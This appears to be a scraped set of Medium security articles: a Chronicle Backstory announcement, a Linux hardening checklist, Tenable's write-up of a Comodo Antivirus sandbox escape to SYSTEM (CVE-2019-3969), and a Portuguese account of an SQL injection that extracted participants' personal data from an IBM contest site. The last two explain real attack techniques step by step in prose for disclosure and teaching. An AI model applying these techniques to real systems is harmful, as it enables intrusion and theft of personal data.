We believe the power of the security community is our best defense against aggressive and determined attackers. By offering a global platform with the ability to apply massive computational capacity to an ever-growing set of enterprise security data, our goal is for Chronicle to help enterprise customers, as well as other vendors, to better protect what matters most. Many of us came to Chronicle from Google and had deep experience protecting Google’s own infrastructure, as well as developing core building blocks of that infrastructure. Others have spent years in the security industry at leading product firms. Chronicle combines these experiences — Google and Industry — to deliver new solutions to a significant problem.
In late January 2019, the Wall Street Journal profiled how Google’s Threat Analysis Group (TAG) protects Google’s own infrastructure. The article describes specific capabilities: global threat intelligence via VirusTotal, a unified dashboard called Nirvana that ties multiple tools together, and TAG itself, a team of threat analysis experts who make sense of the information flowing through these tools. The capabilities described in the WSJ article are extremely powerful, and many organizations would love to have these abilities within their own cyber teams.
Chronicle’s products were inspired by these tools and techniques, and are now available for other organizations to use.
VirusTotal is part of Chronicle, and we spent last year releasing new VT features and products. Two of Chronicle’s founders were also founders of Google’s TAG, and the Chronicle insights team applies those skills to find new threats. In December, some of those analysts discovered the return of the Shamoon malware targeting oil and gas companies. The missing piece is a powerful investigation, analytics, and hunting system to tie together a customer’s internal network activity, external threat intelligence, and curated internal threat signals. Such a system would give analysts the context they need to protect their organizations…i.e. the backstory.
Enter Backstory.
Backstory is a global cloud service where companies can privately upload, store, and analyze their internal security telemetry to detect and investigate potential cyber threats.
How does it work? Chronicle built a new layer over core Google infrastructure where you can upload your security telemetry, including high-volume data such as DNS traffic, netflow, endpoint logs, proxy logs, etc., so that it can be indexed and automatically analyzed by our analytics engine. Your data remains private — it isn’t scanned by or available to anyone for other purposes.
Backstory compares your network activity against a continuous stream of threat intelligence signals, curated from a variety of sources, to detect potential threats instantly. It also continuously compares any new piece of information against your company’s historical activity, to notify you of any historical access to known-bad web domains, malware-infected files, and other threats. Backstory was designed for a world where companies generate massive amounts of security telemetry and struggle to hire enough trained analysts to make sense of it.
Building a system that can analyze large amounts of telemetry for you won’t be useful if you are penalized for actually loading all of that information. Too often, vendors charge customers based on the amount of information they process. Since most organizations generate more data every year, their security bills keep rising, but they aren’t more secure. Backstory is licensed differently, making it easy for you to get value from your own data.
As ESG cybersecurity analyst Jon Oltsik recently wrote, it’s not unusual for CISOs to complain about burning through a three-year security intelligence budget in a year. Backstory’s licensing model can fix that problem.
We’ve spent the past year testing it with organizations ranging in size from 500 to 500,000 employees, some with large security teams and others whose security team is the IT manager. Backstory helps all of these companies get insights about threats and attacks on their networks.
Let’s make this more concrete with an example you may have heard about recently.
In July 2018, the U.S. Department of Justice filed an indictment against 12 Russians for the hack of DNC/DCCC confidential information. The indictment describes how the DNC retained the services of a security vendor to help eradicate the intrusion, but because the vendor missed a Linux-based piece of malware, the intrusion continued and eventually resulted in the leak of DNC emails and other materials.
Specifically, the Linux malware was programmed to communicate with the web domain linuxkrnl.net. The DNC and its vendor missed this and the breach continued (page 12, paragraph 32).
Upon reading this indictment, the first thing a security analyst at a company (for example, a global bank) might ask himself is “Has any machine at our company ever communicated with linuxkrnl.net?”
Seems simple, but since most organizations retain — at best — only a few weeks of network traffic, if the leak happened before that, the analyst is blind.
Now let’s take a short detour: web domains link to IP addresses, a domain can have different IP addresses over time, and to compound the challenge, multiple domains can resolve to a particular IP address. So, which IP addresses has linuxkrnl.net linked to since it was created, and do any other domains link to any of those IPs? If so, then our analyst would need to search for communication to any and all of those domains, back to the point of their creation. How would our analyst do that?
A savvy analyst who’s been following Chronicle’s announcements this past year would start with VirusTotal Private Graph, part of VirusTotal Enterprise. Type linuxkrnl.net into Private Graph and from its billions of files it returns all IP addresses and domain names related to linuxkrnl.net. We quickly see that there are dozens of domain names related to linuxkrnl.net: updatepc.org, mswordupdate17.com, softwaresupportsv.com, etc. Did anyone in our company access any of these domains — or any of the IP addresses they linked to — at any time? If so, we may have already lost confidential information. Most companies simply have no way to answer this. They don’t collect the right telemetry and they don’t retain it for more than a week or two even when they do collect it.
Enter Backstory. Backstory gives organizations a private and secure cloud instance, built on core Google infrastructure, to store all of their telemetry. Backstory normalizes, indexes, and correlates the data, against itself and against third party and curated threat signals, to provide instant analysis and context regarding risky activity. With Backstory, our analyst would know, in less than a second, every device in the company that communicated with any of these domains or IP addresses, ever. Put differently, when this company’s CEO asked “could our bank have been hit by the same attack as the DNC?” our analyst could immediately answer “no, we’re safe” or “yes, we’d better take action.”
Can your security team do the same?
From day one, we have talked about working with the security community to help our customers protect themselves. At RSA 2019 we announced our Index Partner program, including other security companies that have committed to integrate their products with Backstory, so that our mutual customers can automatically get insights about attacks from all of their security products. We also introduced our special Insight Partners, who have embedded their threat intelligence into the Backstory dashboard and analytics engine to offer insights about threats to any endpoint. Security companies Avast and Proofpoint are our inaugural Insight Partners. Finally, we demonstrated our integration with Carbon Black, an endpoint security company, where Backstory correlates Carbon Black’s telemetry with data from other products, over a much longer time horizon than is possible otherwise. Our channel partners will be offering the joint solution shortly.
To learn more, please visit https://chronicle.security/products/backstory/ or register for a Backstory webinar at: https://go.chronicle.security/webinar-introducing-backstory
Written by
",['Cybersecurity']
Common approaches to securing Linux servers and what runs on them.,https://medium.com/@ageis/common-approaches-to-securing-linux-servers-and-what-runs-on-them-dadcacc5388b?source=tag_archive---------4-----------------------,"Are we always doing everything that is necessary to secure, and I mean really seriously secure, any valuable server containing sensitive information on the internet? According to Shodan, the answer is no. Some have reasons to cling to an intense threat model, and others may be more flippant. Both white and black hats sometimes have cause to be secretive about their methods. But achieving real endpoint security is not just this mantra about using 2FA and password managers, installing updates and not clicking on suspicious links. Experts know it’s a lot more complicated than what we tell the public.
This post is simply a variation of a talk I’ve previously given twice at conferences, and is geared toward those who are new to, or learning about Linux security. I am not really discussing web application security here, after all we have the OWASP Top Ten to teach developers about input sanitization, SQL injection, CSRF, XSS, session management and whatnot. I’m talking about what you’re going to want to consider having in place if you are worried about highly advanced attackers and need to guard against the possibility of malicious code or privileged scripts being executed at any point in time, a remote intruder already in your systems, or even an insider threat who’s lying in wait to steal and exfiltrate all of your important data.
I‘ll mention some basic concepts, and include associated tools. So here’s what you should ask yourself:
Is your infrastructure split into groups with varying role-based access levels to different systems, or do users possess entirely homogenous privileges?
acl: getfacl+setfacl
Can you account entirely for what users executed while logged in to one of your machines?
see: auditd, go-audit
So you’re running some C/C++. Obviously that shit is not memory safe, and this accounts for the vast majority of vulnerabilities that arise. Has that code been audited, statically analyzed, or better yet, fuzzed to make sure it’s solid? Have you considered developing in Rust instead?
see: afl, Radamsa, Sulley, boofuzz, Coverity Scan, Valgrind, sanitizers
Is your backend properly separated from your frontend and load balancers? Are those hosts which are able to exist without the open internet having a route to them, actually without a route to them? Have you taken the time to set up a company VPN and grant your machines private, internal addresses?
see: iptables, ufw
Do your employees use their work computers for personal activities like gaming or running applications not related to their work? Or do they have something like a virtual machine or container each for messaging, browsing, development…?
see: Qubes, VirtualBox
File permissions are familiar to anyone with a basic understanding of Unix. If you don’t need a particular user or group to have a read, write, or execute permission on something, then I urge you to just throw it away and always go with the most restrictive model.
more info
Alright, containerization is in theory great for security. But I want to know who’s got permission to build and push images into production. Are they also signed and verified, plus monitored for security updates and CVEs?
see: Docker, LXC
From the IPv4 address space originates a stream of malicious IPs, botnets ready to DDoS, and automated exploit scans going on. You can either collect intelligence about such activity yourself or subscribe to a product feed or blacklists. But how well do your termination points / firewalls react to and incorporate this information?
see: awesome-threat-intelligence
How often have you audited your iptables rules or what your router/firewall is enforcing, or even run verification tests against them? Have you set up the fleet so that machines can only talk to those which they absolutely need to talk to?
see: pfSense, OPNsense
How much effort have you put towards locking this down? Will you be alerted upon unauthorized changes to your nameservers or DNS zone file? Further, have you enabled DNSSEC, for whatever that’s worth?
Personally, I recommend Namecheap as a registrar and Cloudflare for performant DNS.
What does that get you? If I am law enforcement with a court order, datacenter staff or your hosting provider, can I freely read the contents of your server ? Not with full-disk encryption. Moreover, when your disks are decommissioned or replaced, are they going to be wiped? If someone plugs a USB drive into your 1U rack, are you going to get an alert about it?
see: LUKS/cryptsetup
When a developer builds your code and pushes it into production, can you verify that the binary artifact is what it was intended to be and the source code or statically-linked dependencies have not been maliciously modified at some point?
see: Gitian, ReproducibleBuilds
No doubt you might be fetching some software off of a website instead of through your package manager. Did you compare the checksums/hashes or verify the signature on that download before your team member went ahead and built or installed it?
see: Making and verifying signatures with GnuPG
Does it have an AppArmor profile or seccomp filter or RBAC policy specifying what it can and cannot do in terms of system calls and access rights?
see: seccomp, AppArmor
Have you removed insecure ciphersuites and algorithms entirely from the picture (e.g. MD5, SHA1, RC4) and insisted on listing support for only the strongest available? Select the best ciphers, HMACs and key exchange algorithms possible within your compatibility and user story. Prefer elliptic curve to RSA if available. Defaults are probably not good enough. This applies to OpenSSH, GnuPG, OpenVPN, etc.
There’s no excuse to not have transport-layer security on most services exposed to the internet anymore, as one can readily obtain free certificates with Let’s Encrypt.
see: Applied Crypto Hardening, Bulletproof SSL and TLS, Server-side TLS
I’m sorry, but that private key is useless to you if it’s been around for a decade and lived on all of your personal computers. Consider moving certain highly prized keys into cold storage or across the air gap. If your employees all have their own keys, think about adopting a solution to synchronize them across the domain. Secrets should be moved out of version control.
see: GPGSync, sops, Vault
There are quite a few of these, with varying or arguable utility, but there are enough websites out there still without any at all that it’s worth mentioning.
Here’s a list: X-Frame-Options, X-XSS-Protection, X-Content-Type-Options, X-Download-Options, X-Permitted-Cross-Domain-Policies, Content-Security-Policy, Referrer-Policy, Strict-Transport-Security, Public-Key-Pins
see: securityheaders.io, Mozilla web security guidelines
Are you periodically checking that critical files have not been modified, and generating alerts for changes?
see: Tripwire, OSSEC
Okay, so you have some kind of integrity monitoring, but are you just running the tool with the default rule set and haven’t taken the time to actually train it on the specifics of your application deployment?
see: Comparison of host-based intrusion detection systems, Snort
Anyone can subscribe to the correct mailing lists and watch for new exploits as they get disclosed and patched. But when’s the last time you ran anything that checked your stuff for active CVEs?
see: Nessus, CoreOS clair
If you are a big enough target, then do you actually trust Debian/Ubuntu or RHEL or whatever company’s third-party software repository you’ve added to always deliver you flawless, non-malicious packages? Here’s a thought: you can host your own repositories, pin to specific versions and upgrade stuff only after it’s been tested.
Better yet, run an extremely minimal OS based on Alpine or LinuxKit. The more you reduce your “attack surface”, the less likely you are to be exploited.
Meaning AppArmor, SELINUX, Landlock or Smack. Have they done anything for you lately?
Check out PaX and the grsecurity patch. It contains too many neat features to list here, so I direct you straight to their website to learn more about their fine work.
It goes without saying that the kernel and CPU microcode are both items which should not languish in legacy versions, due to multiple privilege escalation bugs in Linux, and recent issues like Spectre and Meltdown.
I’ve been maintaining a list of security-relevant options for systemd service units.
see: grsecurity.net, Linux Kernel Runtime Guard, Kernel Self Protection Project
If you’re not using Thunderbolt or Firewire or the WiFi adapter, or anything which has DMA (Direct Memory Access), then there’s no reason to load those kernel modules.
see: Kernel module blacklisting
Maybe you are sending all your of logs to somewhere, but you don’t have alerts on certain lines or conditions and someone needs to manually go and check them. Logs are great; the data is interesting, so do something with it. Write the Logstash filters and grok patterns, don’t just leave that stuff unexamined.
see: Filebeat, rsyslog, Logstash
RAM, CPU load, free disk space. This is pretty basic but it’s key to detecting unusual activity occurring anywhere so it’s worthy of mention.
see: Metricbeat, Prometheus node_exporter, Nagios, Osquery
Okay, so people are familiar with various aspects of software testing, but not as many do infrastructure tests. How can you continually ensure the state of your system is as you intended it to be?
see: Serverspec, Testinfra
Your BIOS and other low-level interfaces are subject to bugs. Intel® AMT and Management Engine should be disabled, as well as Computrace. Below I’ve linked a very useful framework for analyzing the security of system firmware and hardware components.
see: CHIPSEC
The common guidelines apply to sshd: disable root login, use keys instead of passwords, and set up brute force protection. Listening on an alternate port is actually not all that helpful. A better solution would be to place it behind a VPN, an authenticated Tor hidden service, or require a port-knocking procedure.
see: fail2ban, denyhosts, sshguard, Secure Secure Shell
You don’t want to leak information about what version you’re running. Setserver_tokens off; for nginx and ServerSignature off for Apache. Look for and remove the X-Powered-By header if it’s there.
When running a complex application that’s reliant upon dynamic scripting languages, consider running a WAF (Web Application Firewall) like ModSecurity. Cloudflare provides this service at scale to its customers.
I highly recommend the YubiKey, which has a variety of useful functionality. It can be configured to output a static password (well-suited for PAM user login or mounting volumes encrypted with a passphrase), HOTP, or Universal Two-Factor (U2F), or it can work an OpenPGP smartcard. These devices are indispensable for any sysadmin, as there’s no sense in keeping keys on your hard drive when they can be stored on a smartcard instead. I have published a detailed YubiKey GPG+SSH setup guide.
What are the contents of /etc/resolv.conf? Quad9 is an alternative to Google public DNS or OpenDNS which blocks clients from accessing malicious domains, similar to how Chrome protects users from sites that serve malware via Safe Browsing. Set your nameserver to 9.9.9.9 to try it out.
Beyond keeping your system’s trusted root certificate store up-to-date, you should also check your package manager every once in a while to see which third-parties are trusted, whether their repository signing keys are sufficiently strong (many still use 1024-bit DSA), and remove those which are expired.
try: apt-key list, rpm -qa gpg-pubkey
Nearly everybody’s using git for version control these days. When you make a new release, is it based off of a GPG-signed git tag? One can also sign commits if you like.
see: Signing tags using GPG, Git signing, Git tools — signing your work
Written by
","['Security', 'Infosec', 'Cybersecurity']"
COModo: From Sandbox to SYSTEM (CVE-2019–3969) - Tenable TechBlog - Medium,https://medium.com/tenable-techblog/comodo-from-sandbox-to-system-cve-2019-3969-b6a34cc85e67?source=tag_archive---------2-----------------------,"Antivirus (AV) is a great target for vulnerability hunting: Large attack surface, complex parsing, and various components executing with high privileges. So a couple of months ago, I decided looked at the latest Comodo Antivirus v12.0.0.6810. I ended up finding a few cool things, however one I thought was worth covering here, which is a sandbox escape as well as a privilege escalation to SYSTEM. In this article, we will be abusing various COM objects, bypassing binary signing checks, and hijacking services. I think you will find this to be an interesting one, so let’s get right into it.
First, I’d like to give a primer on Comodo’s sandboxing technology, which Comodo refers to as “containment”, I will be using “sandbox”/”containment” interchangeably in this article. This technology restricts untrusted applications (RTATC) to execute in a sandbox-like environment alongside other running processes on the OS. It features a hybrid of user mode hooks along with a kernel mode driver, preventing any modification to files or registry on the machine. File and registry reads are allowed, but as soon as a write occurs, file I/O is diverted to a sandbox filesystem and future reads are then read back from that sandboxed filesystem to give the illusion that the process is interacting with the filesystem.
Comodo accomplishes this through its filter driver Cmdguard.sys, which registers an _FLT_REGISTRATION structure using FltRegisterFilter API. This structure contains callback routines for various IRPs received from user mode applications, such as file access, file writing, etc and can intercept/act on them accordingly. Also worth noting is that ALPC (a type of Microsoft IPC used for many OS components) is sandboxed as well, which diverts attempted ALPC connections to “sandboxed” svchost.exe instances, preventing sandbox escapes via RPC/ALPC. Below is an illustration of how this containment technology works
Cmdguard.sys not only filters file/registry I/O, but also keeps track of running processes by registering a CREATE_PROCESS_NOTIFY_ROUTINE (using PsSetCreateProcessNotifyRoutine). As a process runs, containment status, trust level, and other Comodo relevant attributes are kept track of in a kernel-stored process list. Cmdguard.sys exposes “filter ports” that user-mode Comodo components can talk to. Containment status is set by sending a specific message to its filterport named “cmdAuthPort”. The target process specified in the message then has its “containment” flag set by the kernel mode driver.
Guard64.dll (which is injected into just about every running process) is responsible for sending these containment message from user-mode after contained process creation. For example, Guard64.dll will hook Explorer.exe’s CreateProcessInternalW API so that when a user executes an untrusted process, the hook sends a “containment” message to Cmdguard.sys filter port. Now when untrusted process starts, it is deemed “contained” by the driver and file/registry I/O is prevented. Also, Cmdguard.sys will inject a Guard64.dll into the contained process, which will perform aggressive user-mode hooking.
Below, we can see just a few of user-mode hooks Guard64.dll will set.
A common role these hooks play is preventing contained processes from connecting to existing securable objects created by non-contained processes. For this, it will append a “!comodo_6” tag to each object name created or opened by a contained process, preventing name collision (or connection) with existing securable objects on the OS.
In fact, this is how its RPC/ALPC containment works! RPC/ALPC traffic is diverted to contained Svchost.exe instances (seen in the first diagram above). This is because “!comodo_6” is appended to port names contained processes attempt to connect to, and the contained Svchost.exe instances happened to create port names with “!comodo_6” appended to them since they themselves are contained. Here we can see a contained MSI installer trying to run and ends up with a sandboxed MSIexec.exe service component created (under cmdvirth.exe) after issuing its RPC calls.
Bypassing these user mode hooks is trivial, but containment escaping through that is not easy. It was not possible, for example, to simply patch ALPC related hooks and escape via WMI, as these were also monitored and blocked by CmdAgent.exe. Now that I have provided a small primer on Comodo containment, let’s look into how we can achieve an escape and escalation.
Comodo uses many IPC mechanisms between its various AV components: Filter Ports, Shared Memory, LPC, and COM. COM is what we will focus on here. A good primer for COM can be found here, but in short it stands for “Component Object Model” and is a Microsoft technology to allow different modules to create and interface with various objects defined by the COM server. COM servers can be local (just a COM server dll loaded in current process) or remote, a COM server running as a remote process and interacted with over ALPC. Exploitation-wise, remote provides a much more interesting scenario.
We happen to know Comodo has the capability to invoke scan jobs from low-privilege processes such as explorer.exe (via it’s Context Shell Handler — (the menu that appears when user right clicks)) or Cis.exe (Comodo client GUI). These scan jobs are executed by invoking routines in CAVWP.exe which runs as SYSTEM.
If we can understand how to connect ourselves to this service (as they do), then perhaps we can uncover a new attack surface for ourselves and may find even more interesting functions than just “scanning”. This remote interaction with CAVWP.exe happens to be through COM, as CAVWP.exe is an out-of-proc COM server as we see in the registry.
Let’s see how Explorer.exe and the Comodo COM client’s remotely trigger these “scans” through COM. As I previously mentioned, one of the low-privileged clients that can initiate these scans is Explorer.exe’s Shell Context Menu handler that Comodo registers — CavShell.dll
Reversing the shell extension handler, I find where the “scan” client COM routine is implemented. Understanding this function is going to give us the keys on how to successfully engineer our custom COM client.
This particular call to CoGetClassObject is interesting. CoGetClassObject returns a pointer to an interface for an object associated with the supplied CLSID. From looking the CLSID up in the registry, we see it is for a “Cis Gate Class” and soon realize CAVavWp.exe has nothing to do with this class, and the actual COM server for this class is CmdAgent.exe.
It turns out CmdAgent acts as a proxy between these low-privilege COM clients and CavWp, as CavWp will scan on behalf of your request to CmdAgent through CisGate interface. Keep in mind, my main goal here is just to get these initial bindings setup and understood so we can explore more attack surface.
After reverse engineering the client (as well as a bit of CmdAgent itself), we port over the COM stubs with appropriate method offsets and re-engineer our code to mimic what these COM clients were doing and execute.
But running this code fails at the “CreateInstance” call in CisClassFactory as it returns E_ACCESSDENIED. This is odd since we have the same process privileges as Explorer.exe and Cis.exe (which can get away with such calls). Why can’t we?
Here we have CmdAgent.exe in debugger, we broke where it receives the “CreateInstance” call we made and see it branches off to a custom E_ACCESS_DENIED message.
This means it wasn’t Windows telling us ACCESS_DENIED, but rather Comodo itself through its own decision.
This particular “decision” is based on a signature check, which verifies that the COM client requesting an instance is a trusted “signed” binary. Looking at the signing check routine in Cmdagent.exe, it looked like signers could be either Comodo or Microsoft, and this makes sense, being that Explorer.exe or Cis.exe are the only expected clients that should be invoking COM methods in CmdAgent.exe.
The signature check was simply bypassed however by….wait…let’s see if you can see the problem. Here is CmdAgent.exe resolving the COM client’s process name to later invoke a signature check from disk:
As you may know, GetModuleFileNameEx just queries the target process’ PEB->Ldr->InMemoryOrderModuleList for full image name. This is in our control of course and can be easily changed within our own process.
An alternative solution to this, is to code inject a trusted Microsoft or Comodo binary and issue our COM requests from there. Comodo however prevents dll injection, so in order to pull this off, we would have to process hollow a trusted Comodo binary instead.
This is a more cumbersome route than manipulating our own PEB, but it gave us great advantages. One of them is that the Cmdguard.sys driver will NOT inject a Guard64.dll that puts annoying hooks in us. Below shows Cmdguard.sys and how it calls “InjectDll” routine only if process is deemed “untrusted”. “IsProcessUntrusted” will pass if we hollow C:\Program Files\COMODO\COMODO Internet Security\CmdVirth.exe for example, because the driver trusts according to executable path, which we are mimicking when we hollow such trusted process.
We now add a process hollowing routine which hollows out an instance of “C:\Program Files\COMODO\COMODO Internet Security\CmdVirth.exe” (signed by Comodo) and replace the executable code with our own. This injected code will now do the same COM routines we had before, except now it will pass signature check and also have no hooks. We re-run the code and successfully trigger a scan job from our low-privilege and contained status!
With scans workings (from a contained process), we can now look for more interesting COM interfaces to play with in CmdAgent. Looking at the other ~60 methods for the CisGate interface we have obtained, they honestly didn’t look too interesting, and the ones that did, had their fair usage of CoImpersonateClient which prevents the logic bugs I was aiming for. There are still more methods to investigate, as there are more supported interfaces we can get. Remember how we use CreateInstance to create a CisGate object in CmdAgent.exe? There are probably more objects we can create, each with more methods to play with. Back to the CmdAgent!
The ICisClassFactory->CreateInstance function creates a desired object and returns requested interface pointer for it by wrapping a call to CisGate->QueryInterface. For those that might not know, QueryInterface is a core function in IUnknown, the base class that all COM classes inherit from. In short, this function resolves a riid (interface identifier) to an object interface so that a client (such as ourselves) can invoke methods on it. With this knowledge, we can see what more interfaces we can obtain by reversing CmdAgent.exe’s QueryInterface function and observing its supported interfaces.
We spot the list of supported_interfaces that their QueryInterface supports and named each GUID as found in our registry. The IID_ICisFacade riid is the one used to return a CisGate object. Been there — done that. The next interesting one to look at is IID_IServiceProvider. Reading about IID_IServiceProvider, it sounded like it can yield all sorts of different things. Searching for the IID_IServiceProvider GUID in Cis.exe (Comodo GUI Client), we find it being used. Reversing engineering this usage will give us a good bearing on how to use it ourselves, and what kind of services they are trying to obtain and do what with.
Here is Cis.exe and how I found it using “IServiceProvider” to QueryService. It’s using it to obtain a Comodo defined “SvcRegistryAccess” object.
The specific usage seen in Cis.exe revealed it was getting an SvcRegistryAccess object from CmdAgent.exe, and then invoking a method on it to read a registry key from and send back the data. Having a SYSTEM process read registry for you already sounds like an interesting attack vector, but I also had a hunch that the developers did not just make this SvcRegistryAccess a “getter-only” class. Back to CmdAgent to see how this COM class is implemented.
In CmdAgent, we can see the ISvcRegistryAccess method that they remotely invoked is directly reading the reg value and returning data to the client with no CoImpersinateClient. Awesome! this means we can read registry values as SYSTEM since that’s the privilege level CmdAgent is running in.
Now let’s see if this COM object supports registry writes. Digging around its vtable, we see a method that calls into “RegSetValueExW”.
It seems pretty clear that if we invoke this method, we can get a registry write as SYSTEM since I don’t see any impersonation APIs being called. We change our COM client code to obtain an IServiceProvider and resolve an ISvcRegistryAccess, and then invoke this “registry write” method. If we look at how we obtained our regInterface, through calling “GetRegInterface”, we actually see the CmdAgent.exe implementation only created a read-only reg key handle, so of course trying to invoke the “write registry” method will result in ACCESS_DENIED issues. I luckily found another method within ISvcRegKey vtable that replaces our registry key handle to “writable” by passing some additional arguments.
We simply add a call to this method with proper args to obtain “writable” ISvcRegistryAccess.
Putting it all together, we come up with the following code, and get a registry write as SYSTEM!
From the top, we run our sandboxed application, which then process hollows a Comodo signed binary (to bypass CmdAgent signature check) which then runs our COM code we wrote and does a registry write as SYSTEM from our “contained” process. A practical escalation through this would be to hijack an existing service and a decent service to hijack was CmdAgent.exe itself. By replacing the ImagePath data in HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CmdAgent, this would replace the CmdAgent service with our own binary, which will run as SYSTEM.
However, we would need CmdAgent service to restart if we wanted to instantly gain these SYSTEM privileges (opposed to waiting for next restart). Luckily, we have a way of doing that, as I found a way we can crash CmdAgent, which will cause the service to be “revived” and mistakenly start our ImagePath we wrote to protected registry key. The CmdAgent crash is very simple, as the process exposes a Section Object of structural data that writable by EVERYONE:
CmdAgent refers to this buffer as a “SharedMemoryDictionary”, which is an entire class object just exposed in shared memory. We can crash this by writing bad size data in object members causing an out of bounds read when CmdAgent tries to read this SharedMemoryDictionary (which is constantly) causing CmdAgent to crash. When service is revived, it executes our new binary instead, which instantly escalates us to SYSTEM.
Code: https://github.com/tenable/poc/tree/master/Comodo/Comodo%20Antivirus
Written by
","['Antivirus', 'Malware', 'Exploit', 'Cybersecurity', 'Windows']"
Como obtive dados de todos os participantes da maratona IBM Behind The Code,https://medium.com/@guilhermelatrova_ptbr/como-obtive-dados-de-todos-os-participantes-da-maratona-ibm-behind-the-code-fd2038f5a187?source=tag_archive---------4-----------------------,"Entenda como o processo funciona e aprenda a prevenir tais ataques
A IBM lançou uma maratona chamada Behind The Code que está rolando neste mês de julho de 2019 para incentivar as pessoas a conhecerem o Watson (IA) e a IBM Cloud através de desafios bem interessantes.
Cada semana um desafio novo é disponibilizado aos participantes e eles tem até o final deste mês para entregar todos.
O desafio está disponível em https://maratona.dev/ para os interessados.
Ao longo das primeiras semanas alguns responsáveis pela maratona sentiram a necessidade de criar uma aplicação simples, que permitiria aos usuários consultar se seus desafios haviam sido entregues com sucesso.
Criaram um site (disponível em: https://desafios.mybluemix.net/) que possibilitaria ao participante digitar seu próprio CPF e verificar se os desafios haviam sido enviados com sucesso.
EDIT: Após a escrita desse artigo, por alguma razão, o site foi removido do ar mesmo com a brecha corrigida.
Até aqui tudo bem, por mera curiosidade️ ️decidi dar uma olhada na aba requests do meu navegador e verificar que tipo de API estava sendo usada para tal consulta, e identifiquei que era:
Após correção do erro, este endereço e comportamento foi modificado para ser um POST para o próprio endereço.
Não podia deixar de imaginar como essa query string estaria sendo consumida dentro do sistema, então comecei a considerar se poderia estar sensível a um ataque simples de SQL Injection.
SQL é a linguagem utilizada em banco dados, e como o próprio nome “injection” sugere, é uma brecha onde você consegue executar comandos SQL dentro de uma aplicação de terceiros.
É uma falha gravíssima que permite um usuário fazer coisas desde deletar dados até extrair informações.
Decidi apenas testar o comando mais básico possível e ver o resultado:
Que produziria algo como:
Para minha surpresa a página retornou uma exception com um stacktrace.
Fiquei tão extasiado que esqueci de tirar print, desculpem
Esse foi o estopim do “ataque”, se eu tivesse recebido uma resposta mais genérica como “não encontrado” isso teria me desmotivado instantaneamente. Então fica a primeira lição:
Gere logs de erros para consumo interno dos desenvolvedores - Nunca exponha exceptions e stacktraces. São informações valiosas pra quem procura brechas no seu sistema.
A partir deste momento, está claro que o desenvolvedor responsável fez algo muito similar a isto (pseudo-código):
No exemplo acima, cpf é a variável que contém meu código malicioso, neste momento eu posso executar qualquer comando no banco de dados deles sem ao menos saber a senha, usuário ou host do banco.
Fica então a segunda lição: SEMPRE filtre todo e qualquer comando que provém do usuário — não permita que ele tenha poder sobre a informação que chega até seu banco.
Antes que possamos executar qualquer comando, eu preciso descobrir que banco eles utilizam: Postgres, MySql, SQLServer ou etc. Isso vai facilitar minha vida na hora de montar as minhas queries.
Podemos tentar advinhar esse tipo de coisa ao tentar consultar tabelas exclusivas de cada banco.
Comecei com a suspeita de que poderia ser MySQL, então tentei a seguinte query:
E pra minha surpresa obtive uma exception deixando bem claro que a tabela não existe. Ótimo, não é MySQL, próximo…
Minha próxima aposta seria um Postgres, nenhum motivo especial, apenas suposição.
E advinha só: Acertei em cheio! No entanto ainda obtive um erro.
Desculpe a falta de prints, não estava acreditando no progresso que tive tão rapidamente. Você pode encontrar imagens nos próximos passos para entender melhor como foi a experiência.
Ao ler o erro exibido, me fez entender que o código tem uma regra clara, ele deve retornar um resultado numérico (como 1, 0, ou outro) e essa query claramente retorna muito mais que isso.
Mas quem se importa com o erro? Eu já identifiquei qual é o banco, é um grande avanço!
Bom, até aqui já sabemos:
Bom, mas que informação obter primeiro? Vou começar do básico, todo sistema tem uma tabela usuario, será que esse também?
Vamos tentar:
No comando acima, eu anulo qualquer retorno da tabela que eles estavam consultando inicialmente ao criar uma condição impossível (1 = 2 nunca será verdadeiro), ao adicionar o UNION SELECT eu posso especificar uma segunda tabela que desejo “combinar” na obtenção do resultado.
BINGO!
A tabela existe, a coluna existe. Mas ainda há um erro. Novamente a stacktrace vai me ajudar a entender o que houve!
Neste exemplo ele deixa claro que ele tentou converter o CPF no formato “000.000.000–00” para número e não foi possível.
Não se preocupe, como sei que o banco é Postgres, eu posso utilizar a função regexp_replace para remover tudo que não for número do valor!
Logo, devo tentar fazer a seguinte request:
Note que estou limpando todos os pontos e traços, mantendo apenas os números e convertendo os resultados.
O retorno da nossa request foi excessivamente amigável. (Com certeza muito mais do que deveria).
Informou que nos retornou 25.475 CPFs de todos os participantes.
Eu sei que vocês devem estar estranhando o “id_desafio” ali, mas confie em mim: isto é apenas para consumo da aplicação. A informação real ali é o CPF de todos os participantes no formato “00000000”
Neste momento quis deixar a criatividade fluir e quis saber se eu poderia advinhar que outras colunas “numéricas” eu poderia conseguir extrair, não foi difícil arriscar: “datanascimento” e “telefone”.
Aqui fica engraçado. Ao arriscar “datanascimento”, o banco me corrigiu e indicou a coluna correta: “data_nascimento”
Devo repetir a primeira lição aqui: Gere logs de erros para consumo interno dos desenvolvedores — Nunca exponha exceptions e stacktraces.
De qualquer forma, obrigado, Postgres! Agora posso realizar com sucesso:
e também:
Precisei utilizar where no telefone porque notei alguns telefones com campo vazio ou confuso que impossibilitaram o retorno da query.
Ok, já tenho dados dos participantes, mas estou curioso, o que mais posso extrair daqui?
Essa pergunta só pode ser respondida se eu descobrir quais tabelas nós temos. Já sabemos que temos um banco Postgres, mas como posso retornar um valor string se a query só retorna valores numéricos?
Bom, a esta altura do campeonato já estou considerando o stacktrace e as exceptions minhas amigas. Vou gerar intencionalmente erros que possibilite eu extrair o que desejo.
A tabela do Postgres que guarda esse tipo de informação vive em pg_catalog.pg_tables.
O que será que acontece quando eu tento converter uma string que é claramente um nome para um número?
Acertou corretamente se achou que a exception ia me informar que string “tabelaX” não pode ser convertida para número.
Me permitem repetir mais uma vez?
Gere logs de erros para consumo interno dos desenvolvedores — Nunca exponha exceptions e stacktraces.
Agora foi questão de paciência, tive que criar condições para filtrar tabelas que eu já havia consultado previamente e ir observando cada erro calmamente.
Fui seguindo com paciência até que identifiquei todas as tabelas que achei interessante:
Em especial, cada fase da maratona é composta por desafios, e em caso de empate, aquele que enviou primeiro ganha. Justo, o único detalhe chato é que esse tipo de informação não poderia ser informada previamente pros participantes.
Bom, já que estou aqui por que não descobrir quantos pontos eu obtive na primeira fase? (SPOILER: Não fui muito bem haha)
Preciso saber quais colunas cada tabela tem. Não deve ser diferente da técnica que usamos pra identificar as tabelas.
No fim (com a mesma paciência), através da request:
descobri as seguintes colunas para a tabela progresso_desafio:
É interessante saber que eles tem uma contagem de erros, me questiono como é usado dentro da aplicação.
Sabendo as colunas ficou facil, bastou executar esta query para obter minha pontuação:
